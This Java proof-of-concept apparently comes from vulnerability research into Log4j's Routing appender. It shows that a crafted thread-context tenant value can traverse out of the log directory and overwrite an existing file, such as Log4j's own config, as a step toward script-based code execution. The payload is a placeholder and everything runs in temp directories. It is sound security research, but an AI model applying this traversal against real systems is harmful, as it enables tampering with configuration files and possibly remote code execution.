// Deliberately NOT in an org.apache.logging.log4j.* package. Follow-up to
// MdcPathTraversalProof.java, asked directly: can this chain into the
// genuine RCE this session already proved elsewhere (log4j-script-injection,
// ScriptRealSourceProof.java -- a real ScriptEngine.eval() executing
// attacker content)? The obvious chain is: use the path-traversal WRITE
// primitive to overwrite Log4j's OWN config file with a malicious
// <Script>-based config, then whatever reloads that config (monitorInterval,
// or the next restart) hands the attacker the already-proven script sink.
//
// That chain has one link this proof exists to test honestly rather than
// assume: FileAppender's `append` attribute defaults to TRUE
// (FileAppender.java:63, `private boolean append = true;`). Appending
// attacker content to the END of an existing, well-formed log4j2.xml (after
// its closing </Configuration> tag) does not cleanly replace it -- it
// corrupts it. A clean swap-in of a fully attacker-controlled document
// requires either the file not existing yet, or the operator's route
// template explicitly setting append="false". Both are tested here,
// separately, rather than the more convenient one assumed.

import java.io.File;
import java.io.FileWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.ThreadContext;
import org.apache.logging.log4j.core.LoggerContext;
import org.apache.logging.log4j.core.config.ConfigurationSource;
import org.apache.logging.log4j.core.config.Configurator;

public class MdcPathTraversalOverwriteProof {

    private static int failed = 0;

    public static void main(String[] args) throws Exception {
        System.out.println("=== Does the MDC path-traversal write chain into overwriting an existing file? ===\n");

        testMode("append=\"true\" (the FileAppender DEFAULT)", true);
        testMode("append=\"false\" (an operator's explicit, plausible-but-not-default choice)", false);

        System.out.println();
        if (failed > 0) {
            System.out.println(failed + " check(s) FAILED");
            System.exit(1);
        }
        System.out.println("All checks passed.");
        System.out.println("\nThe chain to the already-proven script-injection RCE "
                + "(ScriptRealSourceProof.java) is real but conditional, not automatic:\n"
                + "it needs the operator's route template to use append=\"false\" (or the "
                + "target path to not exist yet), which is a plausible but NOT the default "
                + "choice. Under the default append=\"true\", the same traversal still corrupts "
                + "an existing target file's well-formedness (a real integrity/DoS impact -- if "
                + "the target IS Log4j's own config, a corrupted document fails to parse and the "
                + "application falls back to DefaultConfiguration, or continues running its "
                + "already-loaded configuration until the process restarts) but does not hand the "
                + "attacker a clean, fully-controlled replacement document on its own.");
    }

    private static void testMode(String label, boolean append) throws Exception {
        System.out.println("--- " + label + " ---");

        Path intendedDir = Files.createTempDirectory("mdc-overwrite-intended");
        intendedDir.toFile().deleteOnExit();

        // The "victim": stands in for Log4j's own log4j2.xml, or any other
        // existing file the attacker's traversal can reach and whose exact
        // path they know or guess (a predictable location relative to the
        // routing base directory, or simply a well-known absolute path).
        File victim = File.createTempFile("mdc-overwrite-VICTIM", ".xml");
        victim.deleteOnExit();
        String originalContent = "<?xml version=\"1.0\"?>\n<Configuration status=\"error\">\n"
                + "  <Appenders><Console name=\"Console\"/></Appenders>\n"
                + "  <Loggers><Root level=\"INFO\"><AppenderRef ref=\"Console\"/></Root></Loggers>\n"
                + "</Configuration>\n";
        try (FileWriter w = new FileWriter(victim)) {
            w.write(originalContent);
        }

        String attackerPayload = "MALICIOUS-REPLACEMENT-CONTENT";
        // The route template re-adds a fixed ".xml" suffix (mirrors the
        // earlier proof's fixed ".log" suffix), so the MDC value carries only
        // the base name. Computed as the real relative path from intendedDir
        // to the victim's actual parent directory, not assumed to be exactly
        // one "../" -- both are created under the JVM's default temp
        // directory here, but the computation does not depend on that.
        String victimBaseName = victim.getName().substring(0, victim.getName().length() - ".xml".length());
        Path victimParent = victim.toPath().getParent();
        String relPrefix = intendedDir.relativize(victimParent).toString();
        String mdcValue = relPrefix.isEmpty() ? victimBaseName : relPrefix + "/" + victimBaseName;

        String routingConfig = "<?xml version=\"1.0\"?>\n"
                + "<Configuration status=\"error\">\n"
                + "  <Appenders>\n"
                + "    <Routing name=\"PerTenant\">\n"
                + "      <Routes pattern=\"$${ctx:tenant}\">\n"
                + "        <Route>\n"
                + "          <File name=\"Route-${ctx:tenant}\" fileName=\"" + intendedDir.toAbsolutePath()
                + "/${ctx:tenant}.xml\" append=\"" + append + "\">\n"
                + "            <PatternLayout pattern=\"%msg%n\"/>\n"
                + "          </File>\n"
                + "        </Route>\n"
                + "      </Routes>\n"
                + "    </Routing>\n"
                + "  </Appenders>\n"
                + "  <Loggers>\n"
                + "    <Root level=\"INFO\"><AppenderRef ref=\"PerTenant\"/></Root>\n"
                + "  </Loggers>\n"
                + "</Configuration>\n";

        ConfigurationSource source =
                new ConfigurationSource(new java.io.ByteArrayInputStream(routingConfig.getBytes("UTF-8")));
        LoggerContext ctx = Configurator.initialize(MdcPathTraversalOverwriteProof.class.getClassLoader(), source);
        try {
            ThreadContext.put("tenant", mdcValue);
            Logger logger = ctx.getLogger(MdcPathTraversalOverwriteProof.class);
            logger.info(attackerPayload);
        } finally {
            ThreadContext.clearMap();
            Configurator.shutdown(ctx);
        }

        String finalContent = new String(Files.readAllBytes(victim.toPath()), "UTF-8");
        boolean payloadPresent = finalContent.contains(attackerPayload);
        boolean originalGone = !finalContent.contains("<Console name=\"Console\"/>");
        boolean isCleanReplacement = payloadPresent && originalGone && finalContent.trim().equals(attackerPayload);

        assertTrue("the traversal reached and modified the pre-existing victim file at all", payloadPresent);
        if (append) {
            assertTrue(
                    "with append=true (default): original content is NOT fully removed -- "
                            + "corrupted/mixed, not a clean swap (actual content: "
                            + finalContent.replace("\n", "\\n") + ")",
                    !isCleanReplacement && !originalGone);
        } else {
            assertTrue(
                    "with append=false: the victim's original content is GONE and the file is a "
                            + "clean, fully attacker-controlled replacement -- exactly what would be "
                            + "needed to swap in a malicious <Script>-based Log4j config",
                    isCleanReplacement);
        }
        System.out.println();
    }

    private static void assertTrue(String what, boolean ok) {
        if (ok) {
            System.out.println("  [PASS] " + what);
        } else {
            failed++;
            System.out.println("  [FAIL] " + what);
        }
    }
}
